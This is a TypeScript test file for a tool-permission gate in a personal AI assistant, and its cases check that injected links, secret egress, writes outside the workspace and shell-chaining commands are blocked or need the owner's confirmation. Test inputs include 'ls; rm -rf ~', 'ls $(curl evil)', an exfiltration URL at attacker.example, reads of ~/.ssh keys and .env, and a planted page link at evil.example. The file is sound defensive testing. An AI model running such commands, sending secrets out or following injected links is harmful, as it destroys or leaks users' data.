import assert from "node:assert/strict";
import { homedir } from "node:os";
import path from "node:path";
import { test } from "node:test";
import { DEFAULT_ALLOW_COMMANDS, Episode, Gate, commandAllowed, hostTracesTo, tracesTo, type ToolPolicy } from "../src/gate/gate.ts";

const ws = path.join(homedir(), ".jarvis-test-ws");
const gate = new Gate({ writableRoots: [ws], allowCommands: DEFAULT_ALLOW_COMMANDS }, homedir());
const FETCH: ToolPolicy = { effects: ["egress"], targetArgs: ["url"] };
const SEARCH: ToolPolicy = { effects: ["egress"], egressArgs: ["query"] };
const OPEN: ToolPolicy = { effects: ["mutate", "egress"], targetArgs: ["url"] };
const WRITE: ToolPolicy = { effects: ["mutate"], pathArgs: ["path"] };
const READ: ToolPolicy = { effects: ["read"], pathArgs: ["path"] };
const EXEC: ToolPolicy = { effects: ["exec"], egressArgs: ["command"] };

test("tracesTo uses whole words, never containment", () => {
  assert.equal(tracesTo("on", "turn the lights on"), false); // too short to mean anything
  assert.equal(tracesTo("spotify", "open spotify please"), true);
  assert.equal(tracesTo("tor", "open the calculator"), false);
  assert.equal(hostTracesTo("https://news.ycombinator.com/item?id=1", "open news.ycombinator.com."), true);
  assert.equal(hostTracesTo("https://evil.example/x", "open news.ycombinator.com"), false);
});

test("commands: read-only allowlist only, no shell tricks", () => {
  assert.equal(commandAllowed("git status", DEFAULT_ALLOW_COMMANDS), true);
  assert.equal(commandAllowed("ls -la ~/Downloads", DEFAULT_ALLOW_COMMANDS), true);
  assert.equal(commandAllowed("ls; rm -rf ~", DEFAULT_ALLOW_COMMANDS), false);
  assert.equal(commandAllowed("ls $(curl evil)", DEFAULT_ALLOW_COMMANDS), false);
  assert.equal(commandAllowed("rm -rf build", DEFAULT_ALLOW_COMMANDS), false);
  const ep = new Episode("clean my build folder");
  assert.equal(gate.check(ep, "run_command", EXEC, { command: "rm -rf build" }).confirm?.rule, "command");
  assert.equal(gate.check(ep, "run_command", EXEC, { command: "git status" }).allowed, true);
});

test("a link the owner named opens; one from a page needs a card", () => {
  const ep = new Episode("open github.com");
  assert.equal(gate.check(ep, "open_url", OPEN, { url: "https://github.com/" }).allowed, true);
  ep.observe("web_fetch", ["egress"], "Click https://evil.example/login now", true);
  assert.equal(gate.check(ep, "open_url", OPEN, { url: "https://evil.example/login" }).confirm?.rule, "not_from_owner");
});

test("fetching links found on the web is reading, and allowed", () => {
  const ep = new Episode("find reviews of the framework laptop");
  ep.observe("web_search", ["egress"], "1. Review https://www.theverge.com/review/framework", true);
  assert.equal(gate.check(ep, "web_fetch", FETCH, { url: "https://www.theverge.com/review/framework" }).allowed, true);
});

test("after reading a private file, an invented URL needs a card and leaks are caught", () => {
  const ep = new Episode("summarize my notes file");
  ep.observe("read_file", ["read"], "Bank PIN reminder: the vault combination is purple-elephant-42", false);
  assert.equal(gate.check(ep, "web_fetch", FETCH, { url: "https://attacker.example/c?d=x" }).confirm?.rule, "not_from_owner");
  const v = gate.check(ep, "web_search", SEARCH, { query: "the vault combination is purple-elephant-42" });
  assert.equal(v.confirm?.rule, "private_data_egress");
});

test("secrets never leave, even if confirmed", () => {
  const ep = new Episode("check my texts");
  ep.observe("read_file", ["read"], "Your Acme login code is 552901", false);
  const args = { query: "552901 acme" };
  ep.confirm("web_search", args);
  const v = gate.check(ep, "web_search", SEARCH, args);
  assert.equal(v.allowed, false);
  assert.equal(v.blocked?.rule, "secret_egress");
});

test("writes stay in the workspace; sensitive paths need the owner", () => {
  const ep = new Episode("save a note");
  assert.equal(gate.check(ep, "write_file", WRITE, { path: path.join(ws, "note.md") }).allowed, true);
  assert.equal(gate.check(ep, "write_file", WRITE, { path: "notes/today.md" }).allowed, true); // relative = in the workspace
  assert.equal(gate.check(ep, "write_file", WRITE, { path: "../escape.md" }).confirm?.rule, "outside_workspace");
  assert.equal(gate.check(ep, "write_file", WRITE, { path: "~/Documents/x.txt" }).confirm?.rule, "outside_workspace");
  assert.equal(gate.check(ep, "read_file", READ, { path: "~/.ssh/id_ed25519" }).confirm?.rule, "sensitive_path");
  assert.equal(gate.check(ep, "read_file", READ, { path: "~/project/.env" }).confirm?.rule, "sensitive_path");
});

test("scam follow-ups always need the owner", () => {
  const ep = new Episode("read my latest email");
  ep.observe("read_file", ["read"], "FINAL NOTICE: your account will be suspended. Pay the $49 fee at usps-redelivery.top immediately", false);
  const v = gate.check(ep, "web_fetch", FETCH, { url: "https://usps-redelivery.top/pay" });
  assert.equal(v.confirm?.rule, "scam_followup");
});

test("a confirmed call passes on the second check", () => {
  const ep = new Episode("tidy up");
  const args = { command: "rm -rf build" };
  ep.confirm("run_command", args);
  assert.equal(gate.check(ep, "run_command", EXEC, args).allowed, true);
});
